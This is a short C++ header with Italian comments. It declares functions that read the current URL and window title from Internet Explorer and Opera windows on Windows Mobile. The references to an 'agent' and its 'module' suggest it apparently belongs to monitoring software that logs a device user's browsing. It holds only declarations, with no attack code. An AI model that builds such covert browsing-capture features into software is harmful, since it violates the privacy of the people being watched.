#pragma once
#include <string>

using namespace std;

// Prende l'URL da una finestra di IE (per Mobile 6.0 e 6.1),
// wUrl e' la stringa in cui verra' tornato l'Url, wTitle
// e' la stringa dove viene tornato il titolo della finestra,
// evHandle e' l'handle dell'evento associato al modulo. La funzione torna:
// -1: se l'agente si deve fermare
// 0: In caso di errore
// 1: In caso di successo
INT GetIE60Url(wstring &strUrl, wstring &strTitle, HANDLE evHandle);

// Prende l'URL da una finestra di IE (per Mobile 6.5), 
// wUrl e' la stringa in cui verra' tornato l'Url, wTitle
// e' la stringa dove viene tornato il titolo della finestra,
// evHandle e' l'handle dell'evento associato al modulo. La funzione torna:
// -1: se l'agente si deve fermare
// 0: In caso di errore
// 1: In caso di successo
INT GetIE65Url(wstring &strUrl, wstring &strTitle, HANDLE evHandle);

// Prende l'URL da una finestra di Opera (per Mobile 6.0/6.1/6.5), 
// wUrl e' la stringa in cui verra' tornato l'Url, wTitle
// e' la stringa dove viene tornato il titolo della finestra,
// evHandle e' l'handle dell'evento associato al modulo. La funzione torna:
// -1: se l'agente si deve fermare
// 0: In caso di errore
// 1: In caso di successo
INT GetOperaUrl(wstring &strUrl, wstring &strTitle, HANDLE evHandle);